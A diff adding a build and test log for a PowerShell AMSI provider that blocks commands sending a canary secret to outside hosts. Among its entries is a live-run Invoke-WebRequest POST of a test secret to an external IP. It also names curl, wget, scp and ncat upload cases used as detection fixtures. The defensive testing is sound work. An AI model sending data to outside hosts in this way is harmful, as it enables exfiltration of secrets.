@@ -1,0 +1,827 @@
+PowerShell7Guard v0.1 | x64 Release | no system registration performed
+PowerShell 7.6.9 | pinned upstream 434f6002bdf9cf9829406c3ff2b33387982d6168
+
+PS> cmake --build build --config Release
+适用于 .NET Framework MSBuild 版本 18.8.2+ce25c0108
+
+  PowerShell7Guard.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll
+  ProviderTest.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\ProviderTest.exe
+  UpstreamAmsiProvider.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\UpstreamAmsiProvider.dll
+exit=0
+
+PS> build\Release\ProviderTest.exe D:\ctf-ai\powershell7guard\build\Release\UpstreamAmsiProvider.dll baseline
+canary-body/buffer hr=0x0 result=0x1 reads=0 PASS
+canary-body/short-reads hr=0x0 result=0x1 reads=25 PASS
+ordinary-body hr=0x0 result=0x1 reads=0 PASS
+ordinary-command hr=0x0 result=0x1 reads=0 PASS
+exit=0
+
+PS> build\Release\ProviderTest.exe D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll guard
+canary-body/buffer hr=0x0 result=0x4000 reads=0 PASS
+canary-body/short-reads hr=0x0 result=0x4000 reads=25 PASS
+ordinary-body hr=0x0 result=0x1 reads=0 PASS
+ordinary-command hr=0x0 result=0x1 reads=0 PASS
+reordered-put hr=0x0 result=0x4000 reads=0 PASS
+other-host hr=0x0 result=0x1 reads=0 PASS
+marker-in-uri-only hr=0x0 result=0x1 reads=0 PASS
+get-not-covered hr=0x0 result=0x1 reads=0 PASS
+interpolated-body hr=0x0 result=0x1 reads=0 PASS
+literal-escape-not-covered hr=0x0 result=0x1 reads=0 PASS
+extra-statement hr=0x0 result=0x1 reads=0 PASS
+read-error hr=0x0 result=0x1 reads=1 PASS
+zero-progress hr=0x0 result=0x1 reads=1 PASS
+odd-byte-length hr=0x0 result=0x1 reads=0 PASS
+missing-length hr=0x0 result=0x1 reads=0 PASS
+size-limit hr=0x0 result=0x1 reads=0 PASS
+display-name PASS
+exit=0
+
+PS> ctest --test-dir build -C Release --output-on-failure --timeout 30
+Test project D:/ctf-ai/powershell7guard/build
+    Start 1: upstream_baseline
+1/3 Test #1: upstream_baseline ................   Passed    0.07 sec
+    Start 2: guard_provider
+2/3 Test #2: guard_provider ...................   Passed    0.07 sec
+    Start 3: rollback_preflight
+3/3 Test #3: rollback_preflight ...............   Passed    1.72 sec
+
+100% tests passed, 0 tests failed out of 3
+
+Total Test time (real) =   1.88 sec
+exit=0
+
+PS> pwsh -NoProfile -File scripts\Uninstall-Guard.ps1 -CheckOnly -Dll build\Release\PowerShell7Guard.dll
+Rollback preflight: Absent; no registry changes.
+exit=0
+
+PS> pwsh -NoProfile -File scripts\Uninstall-Guard.ps1 -Dll build\Release\PowerShell7Guard.dll
+Already absent; no registry changes.
+exit=0
+
+PS> git apply --reverse --check provider.patch
+exit=0
+
+
+Set-Location D:\ctf-ai\powershell7guard\build\patch-check-a45015c632b145f997fa07117b11fe4e (src\AmsiProvider.cpp initially copied from upstream)
+PS> git apply D:\ctf-ai\powershell7guard\provider.patch
+exit=0
+
+All three applied sources match the active sources byte-for-byte.
+PS> git apply --reverse D:\ctf-ai\powershell7guard\provider.patch
+exit=0
+
+Reversal restored the exact upstream C++ file and removed the two added files.
+All files in upstream.sha256 match.
+0EB637A0000FC5F4F566630DFDC0AA3D676443271FEBCDF9C2BBBA8725FFC6E3  build\Release\UpstreamAmsiProvider.dll
+14FE1C87C35859BE0D3EF8A2DB2FDC6CF44028C6BCBDA8ECE400C72DC3CA8991  build\Release\PowerShell7Guard.dll
+E535BF0A6D2CCAFFA9AA84B9E86B9E7F38ABDCF9B713F3CE6D2861A0351CD612  provider.patch
+Canary fixture: Invoke-WebRequest -Method Post -Uri 'http://127.0.0.1:1/' -Body 'PS7GUARD_TEST_SECRET'
+Ordinary body fixture has the same command and URI, with -Body 'hello'.
+Registry state before rollback: Absent. No registration, registry deletion, ETW capture, or live PowerShell blocking was tested.
+
+App-name fix. Earlier artifact hashes above are historical.
+Long app-name fixture: PowerShell_C:\ + 2000 letter a characters + \pwsh.exe_7.6.9.
+Canary body is unchanged. No pre-fix reproduction or registration was run.
+PS> cmake --build build --config Release
+适用于 .NET Framework MSBuild 版本 18.8.2+ce25c0108
+
+  PowerShell7Guard.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll
+  ProviderTest.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\ProviderTest.exe
+  UpstreamAmsiProvider.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\UpstreamAmsiProvider.dll
+exit=0
+PS> & 'D:\ctf-ai\powershell7guard\build\Release\ProviderTest.exe' 'D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll' guard
+canary-body/buffer hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+canary-body/short-reads hr=0x0 result=0x4000 reads=25 app-calls=2 PASS
+ordinary-body hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+ordinary-command hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+long-app-name hr=0x0 result=0x4000 reads=25 app-calls=2 PASS
+app-name-read-error hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+app-name-oversize hr=0x0 result=0x1 reads=0 app-calls=1 PASS
+app-name-wrong-length hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+app-name-no-terminator hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+reordered-put hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+other-host hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+marker-in-uri-only hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+get-not-covered hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+interpolated-body hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+literal-escape-not-covered hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+extra-statement hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+read-error hr=0x0 result=0x1 reads=1 app-calls=2 PASS
+zero-progress hr=0x0 result=0x1 reads=1 app-calls=2 PASS
+odd-byte-length hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+missing-length hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+size-limit hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+display-name PASS
+exit=0
+PS> ctest --test-dir build -C Release --output-on-failure --timeout 30
+Test project D:/ctf-ai/powershell7guard/build
+    Start 1: upstream_baseline
+1/3 Test #1: upstream_baseline ................   Passed    0.07 sec
+    Start 2: guard_provider
+2/3 Test #2: guard_provider ...................   Passed    0.07 sec
+    Start 3: rollback_preflight
+3/3 Test #3: rollback_preflight ...............   Passed    1.57 sec
+
+100% tests passed, 0 tests failed out of 3
+
+Total Test time (real) =   1.73 sec
+exit=0
+PS> git apply --reverse --check provider.patch
+exit=0
+Rollback test working directory: D:\ctf-ai\powershell7guard\build\app-name-rollback-1186164b292b4bdbbbb4ff1ea0d02e1c
+PS> git apply --reverse D:\ctf-ai\powershell7guard\app-name.patch
+exit=0
+Rollback restored the saved source byte-for-byte.
+PS> git apply D:\ctf-ai\powershell7guard\app-name.patch
+exit=0
+Re-applying restored the fixed source byte-for-byte.
+14FE1C87C35859BE0D3EF8A2DB2FDC6CF44028C6BCBDA8ECE400C72DC3CA8991  D:\ctf-ai\powershell7guard\build\before-app-name-2d5cee1f976d4c5ca3fab6ce8bf74e3e\PowerShell7Guard.dll
+E1012C241EC067F61EC712E27D27A62D4519BBCDD23F1699C1086305F6B07A49  build\Release\PowerShell7Guard.dll
+E0AF365AC6A2FFA5AA8BD7856CE27943B17D26AE8C0B01DCBDA28137DDAEC231  app-name.patch
+9D6EC962FE86AFFF82DE16754E3781837D040B4A17CAFD6A3B07EFEE956328BF  provider.patch
+
+Single-step deployment scripts: no live install/uninstall or privileged writes performed.
+PASS parse Install-Guard.ps1
+PASS parse Registration.ps1
+PASS parse Test-PowerShell7.ps1
+PASS parse Uninstall-Guard.ps1
+PASS ACL-aware directory creation overload exists.
+PS> pwsh -NoProfile -File scripts\Install-Guard.ps1 -WhatIf
+What if: Performing the operation "Copy and register the AMSI provider" on target "C:\Program Files\PowerShell7Guard\PowerShell7Guard.dll".
+exit=0
+PS> pwsh -NoProfile -File scripts\Uninstall-Guard.ps1 -CheckOnly
+Rollback preflight: Absent; deployed DLL present: False; no changes.
+exit=0
+PS> pwsh -NoProfile -File scripts\Uninstall-Guard.ps1
+Already uninstalled.
+exit=0
+PS> cmake --build build --config Release
+CMake is re-running because D:/ctf-ai/powershell7guard/build/CMakeFiles/generate.stamp is out-of-date.
+  the file 'D:/ctf-ai/powershell7guard/CMakeLists.txt'
+  is newer than 'D:/ctf-ai/powershell7guard/build/CMakeFiles/generate.stamp.depend'
+  result='-1'
+-- Selecting Windows SDK version 10.0.28000.0 to target Windows 10.0.26300.
+-- Configuring done (0.0s)
+-- Generating done (0.4s)
+-- Build files have been written to: D:/ctf-ai/powershell7guard/build
+适用于 .NET Framework MSBuild 版本 18.8.2+ce25c0108
+
+  1>Checking Build System
+  Building Custom Rule D:/ctf-ai/powershell7guard/CMakeLists.txt
+  PowerShell7Guard.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll
+  Building Custom Rule D:/ctf-ai/powershell7guard/CMakeLists.txt
+  ProviderTest.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\ProviderTest.exe
+  Building Custom Rule D:/ctf-ai/powershell7guard/CMakeLists.txt
+  UpstreamAmsiProvider.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\UpstreamAmsiProvider.dll
+  Building Custom Rule D:/ctf-ai/powershell7guard/CMakeLists.txt
+exit=0
+PS> ctest --test-dir build -C Release --output-on-failure --timeout 30
+Test project D:/ctf-ai/powershell7guard/build
+    Start 1: upstream_baseline
+1/3 Test #1: upstream_baseline ................   Passed    0.08 sec
+    Start 2: guard_provider
+2/3 Test #2: guard_provider ...................   Passed    0.06 sec
+    Start 3: rollback_preflight
+3/3 Test #3: rollback_preflight ...............   Passed    1.46 sec
+
+100% tests passed, 0 tests failed out of 3
+
+Total Test time (real) =   1.64 sec
+exit=0
+
+regsvr32 sequencing fix: no live registration or elevated writes.
+Live read-only status: Absent; file present: True
+Live read-only deployed DLL matches build SHA-256: True
+Invoke-GuardRegsvr with nonexistent DLL: D:\ctf-ai\powershell7guard\build\registration fixture 5ebce69ac197468994a564395df5d459\missing file.dll
+regsvr32 returned process exit=3 (expected nonzero).
+All PowerShell scripts parsed.
+PS> ctest --test-dir build -C Release --output-on-failure --timeout 30
+Test project D:/ctf-ai/powershell7guard/build
+    Start 1: upstream_baseline
+1/3 Test #1: upstream_baseline ................   Passed    0.09 sec
+    Start 2: guard_provider
+2/3 Test #2: guard_provider ...................   Passed    0.05 sec
+    Start 3: rollback_preflight
+3/3 Test #3: rollback_preflight ...............   Passed    1.66 sec
+
+100% tests passed, 0 tests failed out of 3
+
+Total Test time (real) =   1.82 sec
+exit=0
+PASS: isolated deployment fixture overwrote a different stale DLL without uninstall, registered with simulated registry, then uninstalled and removed the deployed copy.
+
+AMSI metadata phase: x64 Release. No provider registration or ETW capture performed.
+PS> build\Release\ProviderTest.exe D:\ctf-ai\powershell7guard\build\Release\UpstreamAmsiProvider.dll baseline
+canary-body/buffer hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+canary-body/short-reads hr=0x0 result=0x1 reads=25 app-calls=2 PASS
+ordinary-body hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+ordinary-command hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+exit=0
+PS> build\Release\ProviderTest.exe D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll guard
+canary-body/buffer hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+canary-body/short-reads hr=0x0 result=0x4000 reads=25 app-calls=2 PASS
+ordinary-body hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+ordinary-command hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+long-app-name hr=0x0 result=0x4000 reads=25 app-calls=2 PASS
+app-name-read-error hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+app-name-oversize hr=0x0 result=0x1 reads=0 app-calls=1 PASS
+app-name-wrong-length hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+app-name-no-terminator hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+reordered-put hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+other-host hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+marker-in-uri-only hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+get-not-covered hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+interpolated-body hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+literal-escape-not-covered hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+extra-statement hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+read-error hr=0x0 result=0x1 reads=1 app-calls=2 PASS
+zero-progress hr=0x0 result=0x1 reads=1 app-calls=2 PASS
+odd-byte-length hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+missing-length hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+size-limit hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+display-name PASS
+exit=0
+PS> ctest --test-dir build -C Release --output-on-failure --timeout 30
+Test project D:/ctf-ai/powershell7guard/build
+    Start 1: upstream_baseline
+1/3 Test #1: upstream_baseline ................   Passed    0.06 sec
+    Start 2: guard_provider
+2/3 Test #2: guard_provider ...................   Passed    0.07 sec
+    Start 3: rollback_preflight
+3/3 Test #3: rollback_preflight ...............   Passed    1.55 sec
+
+100% tests passed, 0 tests failed out of 3
+
+Total Test time (real) =   1.72 sec
+exit=0
+PS> git apply --reverse --check provider.patch
+exit=0
+9E7257F455D3EAE0D797D755B22848BC676248B0E5D8535370B23B769B3CD95E  build\Release\PowerShell7Guard.dll
+07FCAF8CEAAF7AAF0D7D266CB9C38D1C73052BACA9294F1F62860261FA69C12D  provider.patch
+
+Full capture: x64 Release. Current-user local pipe. No registration, real script execution, network transfers or backups.
+PS> pwsh -NoProfile -File tests\Test-Capture.ps1 -FixtureExe D:\ctf-ai\powershell7guard\build\Release\ProviderTest.exe -Dll D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll
+capture-input hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+PASS: captured PID=39992, 500 bytes, SHA-256=f606a22cc026aa1f5da2d9a6b17f6ea7ee459a4fc5857ebef35561733f572a6e, 5 AST commands.
+exit=0
+Synthetic stream verified source, synthetic session correlation, missing optional fields, PID/TID, process metadata, bytes/hash, and AST categories; a separate native guard test verifies that the canary still blocks.
+2396B4C741589107A293083288776F4AC6D55F2F16493FA4B4BF9CC8972933A0  build\Release\PowerShell7Guard.dll
+9EF2973F6B0FE3BE94200E86850867AA46F180C532D192D684DEC35A8766516A  provider.patch
+03F93B36B1F7023FDF8C7780143AD4EF411F43524396F8FD3D9B4C939BE54A0E  scripts\Watch-Guard.ps1
+062E90CDDF646A9C20D2BA29188A2D982F85D379FB488E32AE9CA8377A32B154  scripts\Capture-Analysis.ps1
+
+PS> pwsh -NoProfile -File tests/Test-Capture.ps1 -FixtureExe D:\ctf-ai\powershell7guard\build\Release\ProviderTest.exe -Dll D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll
+capture-input hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+PASS: captured PID=41568, 500 bytes, 5 AST commands; no sha256 field.
+exit=0
+
+PS> pwsh -NoProfile -File tests\Test-Capture.ps1 -FixtureExe D:\ctf-ai\powershell7guard\build\Release\ProviderTest.exe -Dll D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll -InformationMissing
+capture-input hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+PASS: Warning: Information missing; result=1, no block.
+exit=0
+
+Single-file journal and Rust reader. No provider registration or user log retained.
+PS> pwsh -NoProfile -File tests/Test-ManagedLog.ps1
+PASS: actual pwsh in-process AST, queued file output, warning and blocking, Rust compact/debug.
+rich-script hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+missing-body hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+ast-blocks-double-quoted-literal hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+
+Runspace state: two real local test Runspaces; HTTP examples parsed, not invoked. No installation or ACL changes.
+PS> pwsh -NoProfile -File tests\Test-DataFlow.ps1
+PASS: environment read, verified post-pipeline value, cross-ScriptBlock cache hit, dependency/source, isolation, stale-cache warning or no match, function shadow.
+exit=0
+
+Prompt invalidation regression; no provider registration changes.
+PS> pwsh -NoProfile -File tests/Test-DataFlow.ps1
+PASS: cross-ScriptBlock cache, Runspace isolation, prompt revalidates only referenced variables, unchanged provenance survives, changed and removed values are not reused.
+exit=0
+
+TOML sensitive flows: x64 Release. No registration, ACL changes, real environment writes or network transfers.
+PS> cmake --build build --config Release
+PowerShell7Guard.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll
+exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+upstream_baseline Passed
+guard_provider Passed
+runspace_data_flow Passed
+runspace_sensitive_rules Passed
+rollback_preflight Passed
+PASS: TOML, variable/stdin/file flow, verified and stale copies, warning, upload/download, durable metadata, read-only Machine environment.
+PASS: local bare Git baseline, multiple refs, missing and mismatched preflight warn, deleted-at-tip file matched; no push executed.
+Rollback preflight: Absent; deployed DLLs: 2; no changes.
+100% tests passed, 0 tests failed out of 5
+exit=0
+PS> cargo test --offline --locked --manifest-path reader/Cargo.toml --target-dir build/reader
+test result: ok. 2 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
+test follows_creation_append_partial_and_compaction ... ok
+test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out
+exit=0
+PS> git apply --reverse --check provider.patch
+exit=0
+
+External PowerShell command and loopback exclusion. No local network connection, registration, or ACL change.
+PowerShell executable: C:\Program Files\PowerShell\7\pwsh.exe (-NoProfile -NonInteractive).
+PS> Invoke-WebRequest -Method Post -Uri 'http://124.223.64.165:8080/' -Body 'PS7GUARD_TEST_SECRET'
+FullyQualifiedErrorId=WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+Category=InvalidOperation
+ExceptionType=System.Net.Http.HttpRequestException
+ExceptionType=System.Net.Sockets.SocketException
+SocketErrorCode=AccessDenied
+PowerShellExit=1
+Separate unique-marker run against the same target: ProviderRegistration=Absent; MatchingActualAmsiEvents=0.
+Explicit curl and ncat TCP probes to 124.223.64.165:8080: connection refused before payload; not an AMSI result.
+The AMSI policy-block acceptance requires ParseErrorId=ScriptHasAdminBlockedContent and a matching Guard event with result=0x4000.
+PS> ctest --test-dir build -C Release --output-on-failure
+100% tests passed, 0 tests failed out of 5
+exit=0
+
+Diagnosis of the external command's missing live AMSI block:
+The system 64-bit registry contained neither Guard's AMSI provider key nor its COM InprocServer32 key.
+The two older DLL files in Program Files were present but not registered. The diagnosis did not replace them.
+HKLM\SOFTWARE\Microsoft\AMSI FeatureBits=0x1; the current DLL is NotSigned.
+PS> build\Release\RegistrationTest.exe D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll <temporary-private.hiv>
+DllRegisterServer HRESULT=0x0; expected keys=1
+DllUnregisterServer HRESULT=0x0; expected keys removed=1
+exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File D:\ctf-ai\powershell7guard\tests\Test-ProviderInvocation.ps1
+PowerShell=C:\Program Files\PowerShell\7\pwsh.exe; Version=7.6.9; PID=30164
+Scan=1 result=16384 rule=block:PS7-HTTP-CANARY-001 endpoint=http://124.223.64.165:8080/
+Scan=2 result=1 rule=skip:loopback endpoint=http://127.0.0.1:8080/
+reported-external-command hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+loopback-is-exempt hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+exit=0
+GuardAfterDiagnosis=Absent; ExistingDeploymentFiles=2.
+The diagnostic invoked the native provider directly inside system PowerShell; neither HTTP command executed. The temporary application hive was removed. System registration and ACLs were unchanged.
+
+Generated short/long/simple/complex scan cases; PowerShell 7.6.9 x64.
+PS> pwsh -NoProfile -File tests/Test-SensitiveRules.ps1
+Before: literal using is not a directive expected 1 : {"status":"external-using-skipped"}
+exit=1
+After: PASS: 29 generated length, syntax, confidence and analysis-limit cases.
+exit=0
+Native coexistence check: preload a separately built PowerShell7Guard.Ast.dll in the default context, then load the rebuilt native Provider directly in the same PowerShell process.
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests/Test-ProviderInvocation.ps1 -PreloadBridge <temporary-assembly-path>
+BridgesBefore=PowerShell7Guard.Ast / 4c6f7156-c3eb-448b-854a-f6b6a4778a61 / Default
+BridgesAfter=PowerShell7Guard.Ast / 4c6f7156-c3eb-448b-854a-f6b6a4778a61 / Default,PowerShell7Guard.Ast / d9b2781d-b18b-4b7c-a492-a579b1711d35 / Assembly.Load(byte[], ...)
+reported-external-command hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+loopback-is-exempt hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+64KiB-script-stream hr=0x0 result=0x4000 reads=9363 app-calls=2 PASS
+over-64KiB-not-read hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+220-assignments-and-concatenation hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+Deployment file test: shared-read lock preserves existing file on failure; replacement after unlock changes contents at the same path and creates no backup.
+PS> & .\scripts\Install-Guard.ps1 -WhatIf
+What if: Performing the operation "Deploy and register the AMSI provider" on target "C:\Program Files\PowerShell7Guard\PowerShell7Guard.dll".
+No test re-registered the provider after the user uninstalled it.
+Final ctest: 100% tests passed, 0 tests failed out of 5; exit=0. GuardRegistrationAfter=Absent.
+
+File/folder/pipeline/Base64/archive matrix against the configured external IPv4 command shapes.
+PS> pwsh -NoProfile -File tests/Test-SensitiveRules.ps1
+PASS: 29 generated length, syntax, confidence and analysis-limit cases.
+PASS: 173 additional cases - file=60, folder=18, pipeline=17, base64=15, archive=63.
+exit=0
+These assertions used actual local synthetic file writes and stock Compress-Archive; commands targeting 124.223.64.165:8080 were scanned by the matrix without invocation.
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests/Test-ProviderInvocation.ps1
+base64-body hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+base64-native-stdin hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+archive-file hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+Separate live PowerShell check; HTTP response was not used for acceptance:
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File scripts/Test-PowerShell7.ps1 -Target 'http://124.223.64.165:8080/' -Live
+Guard registration: Absent
+ProbePid=21464
+ErrorId=WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
+Guard AMSI: no matching event.
+No AMSI administrative block in the command's errors; exit=1.
+exit=1
+This does not count as an installed-provider AMSI block. The acceptance requires the original AMSI_RESULT_BLOCKED_BY_ADMIN_BEGIN message and a matching local 0x4000 Guard event. No system registration or ACL changes were made.
+Final content-matrix ctest: 100% tests passed, 0 tests failed out of 5; exit=0.
+
+2026-11-18 — bounded transformation provenance
+PS> cmake --build build --config Release
+D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll
+exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 20 offline provenance, mutation, loop, compression and curl cases; no commands invoked.
+100% tests passed, 0 tests failed out of 5
+exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+tracked-character-mutation hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+clean-character-mutation hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+exit=0
+Matching local log events in logs/events.jsonl (PID=16340):
+sequence=8 result=0x4000 decision=block:PS7-HTTP-CANARY-001
+sequence=9 result=0x1 decision=no-match
+Fixtures were scanned as source; no commands were launched and no request was sent. The native fixture called the built DLL directly, not the system-registered DLL. Read-only deployment check: Registered; fixed registered path C:\Program Files\PowerShell7Guard\PowerShell7Guard.dll, 205312 bytes; fixed build output, 213504 bytes. No installation or ACL changes were made.
+Source rollback: git apply --reverse --check --ignore-space-change build/flow-provenance.patch; exit=0. Actual reverse/forward applied to ten normalized source fixtures and compared byte-for-byte; exit=0. The workspace was not rolled back.
+
+2026-11-18 — separate native CLI adapters
+PS> cmake --build build --config Release
+PowerShell7Guard.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll
+0 warnings, 0 errors (managed build); exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: 46 curl/wget/scp option, source and direction cases; no commands invoked.
+Rollback preflight: Absent; deployed DLLs: 2; no changes.
+100% tests passed, 0 tests failed out of 5
+exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+curl-adapter-upload hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+wget-adapter-upload hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+wget-adapter-download hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+scp-adapter-upload hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+scp-adapter-download hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+exit=0
+Matched log PID=36492: curl 10=0x4000, wget 11=0x4000 and 12=0x1, scp 13=0x4000 and 14=0x1.
+These tests called the DLL Scan directly in PowerShell 7.6.9. The program strings were not executed and no network request was sent.
+PS> & .\build\Undo-NativeAdapters.ps1
+Rollback preflight passed; nothing changed.
+exit=0
+The patch was also reversed and re-applied on ten temporary source fixtures; exact normalized content matched the preceding and current versions. No deployment or registration changes made.
+
+2026-11-18 — source layout
+PS> ctest --test-dir build -C Release --output-on-failure -V  (before final move)
+PASS: 46 curl/wget/scp option, source and direction cases; no commands invoked.
+100% tests passed, 0 tests failed out of 5
+exit=0
+Moved 31 files to src/provider, src/analysis (including adapters), src/loader and src/reader. Implementation files compared byte-for-byte; only build metadata, paths and documentation changed.
+PS> cmake --build build --config Release
+PowerShell7Guard.vcxproj -> D:\ctf-ai\powershell7guard\build\Release\PowerShell7Guard.dll
+exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V  (new layout)
+PASS: 46 curl/wget/scp option, source and direction cases; no commands invoked.
+100% tests passed, 0 tests failed out of 5
+exit=0
+PS> cargo test --locked --manifest-path src/reader/Cargo.toml --target-dir build/reader
+2 unit tests and 1 log follow test passed; exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests/Test-ProviderInvocation.ps1
+curl-adapter-upload hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+scp-adapter-download hr=0x0 result=0x1 reads=0 app-calls=2 PASS
+exit=0
+No command payload was executed or sent. No install, registration, or permission changes.
+PS> & .\build\Undo-SourceLayout.ps1
+Source layout rollback preflight passed; no files altered.
+Reverse and forward patch also checked on temporary fixtures.
+
+2026-11-18 — outbound security TODO
+PS> cmake --build build --config Release
+GuardAst: 0 warnings; 0 errors. PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure
+100% tests passed, 0 tests failed out of 5; exit=0
+Focused verbose suite: PASS: 30 P0/P1 command-analysis cases.
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+loopback-not-trusted-by-default hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+p0-preceding-command hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+p0-http-headers hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+p0-curl-option hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+p0-url-query hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+p0-ncat-stdin hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+Journal PID=35004, scans 10-14, each result=0x4000 and decision=block:PS7-HTTP-CANARY-001.
+Direct DLL Scan with synthetic source only; no payload was executed, no external request sent, and no installation, registration or permission changes made.
+PS> & .\build\Undo-SecurityTodo.ps1
+Rule fixes rollback preflight passed; no files altered.
+Reverse and forward patch tested on 25 temporary source fixtures.
+
+2026-11-18 — P1 TODO completion
+PS> cmake --build build --config Release
+GuardAst: 0 warnings, 0 errors. PowerShell7Guard.dll built; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
+PASS: warmed separate PowerShell process sees confirmed file and durable metadata immediately.
+PASS: 44 P0/P1 command-analysis cases (14 added this round).
+100% tests passed, 0 tests failed out of 5; exit=0
+PS> & 'C:\Program Files\PowerShell\7\pwsh.exe' -NoProfile -NonInteractive -File tests\Test-ProviderInvocation.ps1
+p1-positional-splat hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+p1-json-content hr=0x0 result=0x4000 reads=0 app-calls=2 PASS
+exit=0
+Workspace log records correspond to PID 26976; a direct DLL scan is not a registered end-to-end test. No network test was sent and no registry change was made.
+PS> & .\build\Undo-SecurityTodoCompletion.ps1
+Rule fixes rollback preflight passed; no files altered.
+The 11-file patch was reversed and reapplied in temporary source fixtures; exit=0.
+
+2026-11-18 — eight outbound-analysis findings
+PS> cmake --build build --config Release
+GuardAst: 0 warnings, 0 errors. PowerShell7Guard.dll linked; exit=0
+PS> ctest --test-dir build -C Release --output-on-failure -V
